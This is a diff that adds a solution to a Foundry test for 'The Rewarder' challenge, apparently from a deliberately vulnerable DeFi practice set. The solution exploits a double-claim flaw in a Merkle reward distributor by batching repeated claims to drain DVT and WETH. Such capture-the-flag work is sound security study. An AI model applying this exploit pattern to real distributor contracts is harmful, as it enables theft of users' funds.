@@ -148,8 +148,50 @@ contract TheRewarderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_theRewarder() public checkSolvedByPlayer {
-        
-    }
+        // Vulnerability in the claimRewards() function, it doesnt account the fact that user can claim a token multiple times in one go
+        // it only sets the token is claimed by user at the last index or when `token != inputToken[inputClaim.tokenIndex])
+        // Hence if the loop have continually claims with the same token, the `else` branch will be taken and allows to claim
+        // arbitrary amount.
+
+        uint256 PLAYER_INDEX = 188;
+        uint256 PLAYER_DVT_CLAIM_AMOUNT = 11524763827831882;
+        uint256 PLAYER_WETH_CLAIM_AMOUNT = 1171088749244340;
+        uint256 DVT_CLAIM_COUNT = TOTAL_DVT_DISTRIBUTION_AMOUNT / PLAYER_DVT_CLAIM_AMOUNT;
+        uint256 WETH_CLAIM_COUNT = TOTAL_WETH_DISTRIBUTION_AMOUNT / PLAYER_WETH_CLAIM_AMOUNT;
+
+        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
+        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
+
+        IERC20[] memory tokensToClaim = new IERC20[](2);
+        tokensToClaim[0] = IERC20(address(dvt));
+        tokensToClaim[1] = IERC20(address(weth));
+
+
+        Claim[] memory claims = new Claim[](DVT_CLAIM_COUNT + WETH_CLAIM_COUNT);
+        for (uint256 i = 0; i < DVT_CLAIM_COUNT; i++) 
+        {
+            claims[i] = Claim({
+                batchNumber: 0,
+                amount: PLAYER_DVT_CLAIM_AMOUNT,
+                tokenIndex: 0,
+                proof: merkle.getProof(dvtLeaves, PLAYER_INDEX)
+            });
+        }
+        for (uint256 i = DVT_CLAIM_COUNT; i < DVT_CLAIM_COUNT + WETH_CLAIM_COUNT; i++) 
+        {
+            claims[i] = Claim({
+                batchNumber: 0,
+                amount: PLAYER_WETH_CLAIM_AMOUNT,
+                tokenIndex: 1,
+                proof: merkle.getProof(wethLeaves, PLAYER_INDEX)
+            });
+        }
+
+        distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});
+
+        dvt.transfer(address(recovery), dvt.balanceOf(player));
+        weth.transfer(address(recovery), weth.balanceOf(player));
+    }       
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
@@ -185,6 +227,9 @@ contract TheRewarderChallenge is Test {
 
         leaves = new bytes32[](BENEFICIARIES_AMOUNT);
         for (uint256 i = 0; i < BENEFICIARIES_AMOUNT; i++) {
+            if (rewards[i].beneficiary == 0x44E97aF4418b7a17AABD8090bEA0A471a366305C) {
+                console.log(i);
+            }
             leaves[i] = keccak256(abi.encodePacked(rewards[i].beneficiary, rewards[i].amount));
         }
     }
